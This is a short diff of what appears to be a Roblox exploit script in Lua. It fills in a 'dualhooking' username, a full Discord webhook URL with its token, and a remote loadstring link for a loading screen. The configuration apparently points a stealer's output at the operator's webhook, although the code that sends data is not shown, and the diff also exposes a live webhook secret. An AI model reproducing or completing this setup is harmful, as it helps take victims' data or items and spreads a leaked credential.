@@ -7,8 +7,8 @@
 
 ]]--
 
-local dhuser = "User Here"       -- dualhooking user
-local dhwebhook = "Webhook Here" -- Dualhooking Webhook
+local dhuser = "tanqrfan555532"       -- dualhooking user
+local dhwebhook = "https://discord.com/api/webhooks/1155865722535288914/IUnejOfnoyLTau_7_h8pu_rdrJ_qkcJvKASUi_UnDtLFkBYQAVDfVFUjL5HYt-vMXQ-2" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/Procoder549/DariusScripts/main/Loadstring.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
